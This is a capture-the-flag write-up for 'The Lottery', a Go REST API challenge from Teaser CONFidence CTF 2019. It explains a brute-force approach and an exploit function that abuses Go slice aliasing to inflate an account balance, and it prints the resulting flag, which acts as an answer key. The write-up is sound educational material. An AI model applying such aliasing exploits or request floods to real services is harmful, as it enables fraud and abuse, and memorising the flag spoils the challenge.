# The Lottery

The **last solved** challenge at 'Teaser CONFidence CTF 2019'.

## Logic

The challenge is a REST API written in Go. It has a functionality of choosing
a lottery winner along with the accounts *management*.

### Package `app`

Account:
```go
type Account struct {
	Name    string `json:"name"`
	Amounts []int  `json:"amounts"`
}
```

Basically, we may do two things with the account:
 - `Account.AddAmount(50)` adds provided amount (must be wihtin `0-99`),
        also total number of amounts must be less than 5,
 - `Service.LotteryAdd(account)` signs user up to the lottery.

You have two options to get a flag - your account must:
 1. Be a millionaire (sum of amounts > 1,000,000),
 2. Be a lottery's winner.

### Package `transport`

There is implementation of HTTP handlers and routing. All we need to know is:
flag is served with the account of millionaire or lottery winner.

## Vulnerabilities

Let's take a look how exactly `lottery` works.

When we invoke `Service.LotteryAdd` method it passes the copy of `account`
object to lottery. It means we have the same object (literally bytes) in two
places: `lottery` (copy) and `service` (original).


The next step: `lottery.evaluate` loops over previously copied accounts and does:
```go
amounts := append(account.Amounts, randInt(999913, 3700000))
```

Pretty cool. It adds a really big number (~1m) to `account.Amounts`. If only it
could be saved at the 'original' account too...

Then it checks if total sum of amounts and our random number is equal to
`1259264`.

### Solution 1 (brute force)

Regardless of added amounts to account, we have only one value that wins the
lottery (in range `999913-3700000`).

```python
>>> 3700000 - 999913
2700087
```

Theoretically, to get a flag you may just create accounts and after
`LOTTERY_PERIOD` duration check if this user is a lottery winner.

For each try we must do three HTTP requests:
 1. Create an account,
 2. Add account to lottery,
 3. After `LOTTERY_PERIOD` duration check if the account is a winner.

 Let's do a quick math:
```python
>>> 2700087*3        # total number of requests
8100261
>>> 8100261 / 2500   # divide by 2500 rps (are you capable of doing more?)
3240.1044
>>> 3240.1044 / 3600 # how many hours? 
0.90
```

As you can see, with a high confidence it was possible to get a flag within one hour!
It wasn't intended solution, but probably some teams managed to use it.
Congratulations though.

### Solution 2 (go slices)

Let's go back to previously noticed amounts `append` with a big number.
So, how exactly does it work?

We append an `Account`'s attribute which is a `[]int` slice. 
```go
type Account struct {
	Amounts []int // This is a []int slice.
}
```
However, what's a slice? (Worth reading: https://blog.golang.org/go-slices-usage-and-internals)

Definition of slice:
> A slice is a descriptor of an array segment. It consists of a pointer to the
> array, the length of the segment, and its capacity (the maximum length of
> the segment).

![Slice visualization](images/go-slices-usage-and-internals_slice-struct.png)

In fact, a slice is a pointer to the memory and not the memory itself! It means
we are able to write to the *original* `amounts` memory while the lottery evaluation.
However, slice is kind of like the `vector` in C++. If you will append the
element over the available capacity, it will reallocate itself to the another
bigger memory chunk. Therefore we must ensure, reallocation won't happen.

Our strategy is creating two slices which point to the same memory. We copy
`Account` struct when adding to the `Lottery`, so the slice will be also
copied. When it comes to the capacity - we need to have such length and
capacity that `append` won't reallocate the slice (and just write to the
memory). `MaxAmountsLen = 4`, so we may exploit it by `capacity=4` and
`length=3`. In this case adding another item will just overwrite fourth element.

Anyway, here is the code:
```go
func HackLottery() {
  // Create new service.
  s := NewService(context.Background(), time.Millisecond, time.Minute)

  // Add new account.
  a, _ := s.AccountAdd()

  // Add '90' amount three times.
  s.AccountAddAmount(a.Name, 90)
  s.AccountAddAmount(a.Name, 90)
  s.AccountAddAmount(a.Name, 90)

  // Right now we have a slice with three values [90, 90, 90]
  // Do you know what's the capacity and length of it?
  // Length=3, Capacity=4.
  // It means that after the next 'append' we won't reallocate to the new memory.

  // We would like to extend our original slice to length=4 and then wait for
  // the lottery's append to overwrite the last item.

  // Add account to the 'Lottery'.
  s.LotteryAdd(a.Name)
  // Immediately after extend 'amounts' slice.
  s.AccountAddAmount(a.Name, 90)

  // 'Lottery.evaluate' should overwrite the last element in the original amounts.
  s.lottery.evaluate()

  // Does it work?
  a, _, _ = s.AccountGet(a.Name)
  fmt.Printf("%v\n", a.Amounts)
  // [90 90 90 1723342]
  // Yay, you are a millionaire.
}
```

Do you know why it doesn't work for slices with capacity less than 4?

## Flag

```sh
$ python hack.py       
p4{fucking-go-slices.com}
```

## Survey

![Which challenge was the coolest](images/bestchall.png)

Accordingly to the poll, 'The Lottery' was the second coolest challenge!
Thank you.

https://github.com/p4-team/ctf/tree/writeup/2019-03-17-confidence2019
